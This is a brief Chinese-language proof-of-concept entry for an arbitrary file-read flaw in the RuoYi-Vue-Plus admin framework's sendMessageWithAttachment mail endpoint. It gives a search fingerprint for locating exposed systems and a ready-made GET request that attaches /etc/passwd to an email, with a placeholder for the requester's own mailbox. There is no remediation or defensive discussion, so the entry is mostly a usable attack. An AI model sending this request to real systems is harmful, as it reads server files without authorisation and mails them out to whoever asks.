# 若依框架sendMessageWithAttachment存在任意文件读取漏洞

- **系统**：若依　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="RuoYi-Vue-Plus后台管理框架"`
- **请求**：`GET /demo/mail/sendMessageWithAttachment?to=test@gmail.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd  HTTP/1.1`

**请求体 / payload**
```
GET /demo/mail/sendMessageWithAttachment?to=你的邮箱@163.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd HTTP/1.1
```
- **预期**：200　|　—